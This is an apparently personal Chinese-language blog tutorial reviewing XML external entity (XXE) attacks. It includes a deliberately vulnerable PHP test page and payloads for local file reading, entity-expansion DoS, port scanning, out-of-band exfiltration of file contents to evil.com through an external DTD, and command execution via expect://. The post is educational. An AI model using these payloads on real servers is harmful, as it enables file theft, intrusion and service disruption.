---
layout: post
title: XML 实体攻击回顾
tags: [security,web]
---

XML实体攻击已经是一个很老的技术了，这里仅对学习的过程做一个记录。

```php
<form method="POST" action="">
	<textarea name="keyword" value="" style="width: 500px; height: 300px"></textarea>
	<input type="submit" value="submit">
</form>

<?php
$keyword = $_POST['keyword'];
$xml_obj = simplexml_load_string($keyword);
var_dump($xml_obj);
```

上面这段代码用于XXE实体攻击的练习，你可以将其保存至你的环境下用于测试。（记得删除 :P）

XML讲解可以参考w3schools的教程-[XML](http://www.w3schools.com/xml/)。

这里简单说一下XML中的实体类型，大致有下面几种：

* 字符实体
* 命名实体
* 外部实体
* 参数实体

除参数实体外，其它实体都以字符（&）开始，以字符（;）结束。常规实体有：`&apos;（'）`、`&amp;（&）`、`&quot;（"）`、`&lt;（<）`、`&gt;（>）`。

**字符实体**类似html中的实体编码，形如：`&#97;（十进制）`或者`&#x61;（十六进制）`。

**命名实体**可以说成是变量声明，命名实体只能声明在DTD或者XML文件开始部分（<!DOCTYPE>语句中）。如下面代码所示：

    <?xml version="1.0" encoding="utf-8"?>
    <!DOCTYPE root [
        <!ENTITY x "First Param!">
        <!ENTITY y "Second Param!">
    ]>
    <root><x>&x;</x><y>&y;</y></root>

**外部实体**用于加载外部文件的内容。（XXE攻击主要利用此实体）

    <?xml version="1.0" encoding="utf-8"?>
    <!DOCTYPe root [
        <!ENTITY outfile SYSTEM "outfile.xml">
    ]>
    <root><outfile>&outfile;</outfile></root>

**参数实体**用于DTD和文档的内部子集中。与一般实体相比它以字符（%）开始，以字符（;）结束。只有在DTD文件中才能在参数实体声明的时候引用其他实体。（XXE攻击常结合利用参数实体进行数据回显）

    <?xml version="1.0" encoding="utf-8"?>
    <!DOCTYPE root [
        <!ENTITY % param1 "Hello">
        <!ENTITY % param2 " ">
        <!ENTITY % param3 "World">
        <!ENTITY dtd SYSTEM "combine.dtd">
        %dtd;
    ]>
    <root><foo>&content</foo></root>
    
combine.dtd中的内容为：

    <!ENTITY content "%param1;%param2;%param3;">
    
上面combine.dtd中定义了一个基本实体，引用了3个参数实体：

    %param1;，%param2;，%param3;。

解析后`<foo>...</foo>`中的内容为`Hello World`。

XML实体攻击主要利用了XML实体中的外部实体结合各种协议来读取服务器上的数据，在DTD文件中的参数实体声明时能够引用其他参数实体的值，因此在XXE攻击回显遇到困难时会用到。

### * 简单文件读取

因为可以进行外部实体加载，在XXE攻击中常用来进行本地文件读取。

    <?xml version="1.0" encoding="utf-8"?>
    <!DOCTYPE root [
        <!ENTITY content SYSTEM "file://localhost/c:/windows/win.ini">
    ]>
    <root><foo>&content;</foo></root>
    
![img](/images/articles/2015-06-08-xml-entity-attack-review/file_read.jpeg)

在使用`file://`协议时，有以下几种格式：

    * Linux
    file:///etc/passwd
    
    * Windows
    file:///c:/windows/win.ini
    file://localhost/c:/windows/win.ini
    （下面这两种在某些浏览器里是支持的）
    file:///c|windows/win.ini
    file://localhost/c|windows/win.ini
    
除了使用`file://`协议进行文件读取外，如果XML文档是用PHP进行解析的，那么还可以使用`php://filter`协议来进行读取。

    <?xml version="1.0" encoding="utf-8"?>
    <!DOCTYPE root [
        <!ENTITY content SYSTEM "php://filter/resource=c:/windows/win.ini">
    ]>
    <root><foo>&content;</foo></root>
    
### * DoS攻击

因为解析器会解析文档中的所有实体，因此如果实体声明层层嵌套的话，在一定数量上可以对服务器器造成DoS。

    <?xml version="1.0" encoding="utf-8"?>
    <!DOCTYPE root [
        <!ENTITY x1 "CPU Consuming Task!">
        <!ENTITY x2 "&x1;&x1;">
        <!ENTITY x3 "&x2;&x2;&x2;">
        ...
        <!ENTITY x100 "&x99;&x99;&x99;...">
    ]>
    <root><foo>&x100;</foo></root>

嵌套实体声明曾指数增长，可能造成对服务器的DoS。

    <?xml version="1.0" encoding="utf-8"?>
    <!DOCTYPE root [
        <!ENTITY dos SYSTEM "/dev/zero">
    ]>
    <root></root>
    
加载一个不稳定的文件描述也可能产生DoS。

### * 端口扫描

加载外部DTD时有两种加载方式，一种为私有`private`，第二种为公告`public`。

私有类型DTD加载：

    <!ENTITY private_dtd SYSTEM "DTD_location">
    
公共类型DTD加载：

    <!ENTITY public_dtd PUBLIC "DTD_name" "DTD_location">
    
在公共类型DTD加载的时候，首先会使用`DTD_name`来检索，如果无法找到，则通过`DTD_location`来寻找此公共DTD。利用`DTD_location`，在一定的环境下可以用来做内网探测。

    <?xml version="1.0" encoding="utf-8"?>
    <!DOCTYPE root [
        <!ENTITY portscan SYSTEM "http://localhost:3389">
    ]>
    <root><foo>&portscan;</foo></root>
    
因解析器种类不同，所以针对XXE攻击进行端口扫描需要一个合适的环境才能够实现，例如：有明显的连接错误信息。

### * 利用DTD进行数据回显

当利用XXE攻击进行文件读取时经常因为没有回显而显得鸡肋，这个时候就可以结合参数实体的特殊性，加载一个外部DTD来进行回显。

    <?xml version="1.0" encoding="utf-8"?>
    <!DOCTYPE root [
        <!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=c:/windows/win.ini">
        <!ENTITY % dtd SYSTEM "http://192.168.1.100:8000/evil.dtd">
        %dtd;
        %send;
    ]>
    <root></root>
    
其中`evil.dtd`的内容如下：

    <!ENTITY % payload "<!ENTITY &#x25; send SYSTEM 'http://evil.com/?content=%file;'>">
    %payload;
    
在DTD文件中声明了参数实体`payload`，其值是一个实体参数声明，因为是在DTD里面，所以可以引用上文的`%file;`参数实体，`%file;`参数实体为`c:/windows/win.ini`文本的内容。最后在原XML里引用DTD中的参数实体，此时就可以讲本地文件读取的内容通过HTTP发送出去（为了让请求的URL有效，这里对使用了`php://filter`协议，并将内容使用base64进行了编码）。

![img](/images/articles/2015-06-08-xml-entity-attack-review/redirect_file.jpeg)

此方法针对数据不回显的情况及其有用。

### * 远程命令执行

当然了，除了文件读取和DoS外，某些情况下还能进行RCE。例如在PHP开启了PECL上的Expect扩展时，就能使用`expect://`协议来执行命令。

    <?xml version="1.0" encoding="utf-8"?>
    <!DOCTYPE root [
        <!ENTITY content SYSTEM "expect://dir .">
    ]>
    <root><foo>&content;</foo></root>
    
利用XXE攻击时需要结合实际环境才能发挥出其威力。:D

### 参考

* [http://www.ibm.com/developerworks/cn/xml/x-entities/](http://www.ibm.com/developerworks/cn/xml/x-entities/)
* [https://www.youtube.com/watch?v=eHSNT8vWLfc](https://www.youtube.com/watch?v=eHSNT8vWLfc)
* [http://blogs.msdn.com/b/ie/archive/2006/12/06/file-uris-in-windows.aspx](http://blogs.msdn.com/b/ie/archive/2006/12/06/file-uris-in-windows.aspx)
* [http://en.wikipedia.org/wiki/File_URI_scheme](http://en.wikipedia.org/wiki/File_URI_scheme)

